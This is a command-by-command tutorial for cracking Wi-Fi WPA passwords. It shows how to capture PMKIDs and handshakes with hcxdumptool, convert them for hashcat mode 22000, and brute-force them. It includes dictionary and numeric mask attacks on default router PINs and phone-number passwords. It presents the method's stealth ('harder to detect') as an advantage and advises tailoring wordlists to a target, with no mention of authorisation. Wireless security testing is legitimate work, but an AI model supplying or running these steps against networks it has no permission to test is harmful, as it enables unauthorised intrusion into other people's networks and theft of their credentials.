1. Overview & Methodology

Modern Wi-Fi cracking leverages Hashcat Mode 22000, which combines the capture of PMKIDs (Pairwise Master Key Identifiers) and EAPOL handshakes into a single unified structure.

Key Advantage This methodology does not require knocking connected clients off the network with disruptive deauthentication attacks. It operates silently, making it harder to detect.

The Workflow:

  1. Place the wireless interface in monitor mode.
  2. Use hcxdumptool to passively capture authentication frames.
  3. Convert the capture to a hash.hc22000 format.
  4. Use hashcat to brute-force or guess the password.

2. Prerequisites & Lab Setup

Before starting, ensure you have the following:

  • Hardware: A compatible wireless adapter supporting monitor mode and packet injection (e.g., ALFA AWUS036ACH).
  • OS: Linux (Kali, Ubuntu, Parrot). Windows is used only for the final cracking step.
  • Software: hcxdumptool, hcxtools, and hashcat.
  • Wordlist: rockyou.txt for dictionary attacks.

3. Step 1: Interface Preparation & Service Termination

1. Identify your interface:

$ iwconfig

(Note down your interface name, e.g., wlan0).

2. Stop interfering services:

$ sudo systemctl stop NetworkManager.service
$ sudo systemctl stop wpa_supplicant.service

4. Step 2: Install Capture Tools

4.1 Option A: Via APT

$ sudo apt update
$ sudo apt install hcxdumptool hcxtools -y

4.2 Option B: Build from GitHub (Recommended)

$ git clone https://github.com/ZerBea/hcxdumptool.git
$ cd hcxdumptool
$ make
$ sudo make install

5. Step 3: Capturing Wi-Fi Hashes

Run hcxdumptool to capture PMKIDs and handshakes:

$ sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=1
  • -i wlan0 → Your interface.
  • -o dumpfile.pcapng → Output file.
  • --enable_status=1 → Real-time status.

Action: Let it run for a few minutes. Press Ctrl + C to stop.

6. Step 4: Restart Network Services

Restore normal network operations:

$ sudo systemctl start wpa_supplicant.service
$ sudo systemctl start NetworkManager.service

7. Step 5: Convert to Hashcat Format (Mode 22000)

Convert .pcapng to .hc22000:

$ hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
  • -o hash.hc22000 → Output hashes.
  • -E essidlist → List of detected SSIDs.

8. Step 6: Filter Target BSSID (Optional)

If multiple networks are present, filter for your target:

  1. View SSIDs: cat essidlist
  2. Edit the hash file: nano hash.hc22000
  3. Keep only the line matching your target BSSID. Delete others.

9. Step 7: Cracking with Hashcat

GPU Recommended Cracking is vastly faster on dedicated GPUs (Nvidia RTX) than CPUs.

9.1 Dictionary Attack

Using the classic rockyou.txt wordlist:

$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

9.2 Brute-Force Numeric Attack (8-digit PIN)

Targeting default router passwords (e.g., TP-Link). -a 3 = mask attack, ?d = digit.

C:\> hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

9.3 Incremental Brute-Force (8 to 10 digits)

For variable lengths like phone numbers:

C:\> hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 10 ?d?d?d?d?d?d?d?d?d?d

10. Step 8: View the Recovered Password

After cracking, reveal the password:

C:\> hashcat.exe -m 22000 hash.hc22000 --show

Output format: <HASH>:<PLAINTEXT_PASSWORD>

11. Troubleshooting & Tips

  • VM Issues: If Hashcat says "No devices found", you lack GPU passthrough. Copy the hash.hc22000 file to a physical Windows machine.
  • PCI Bus Error: Try running hcxdumptool without the --active_beacon flag.
  • Speed: Use --force in Hashcat if you get driver errors, but be cautious.
  • Wordlists: Tailor your dictionary to the target (e.g., country-specific passwords, SSID-based patterns) for faster results.
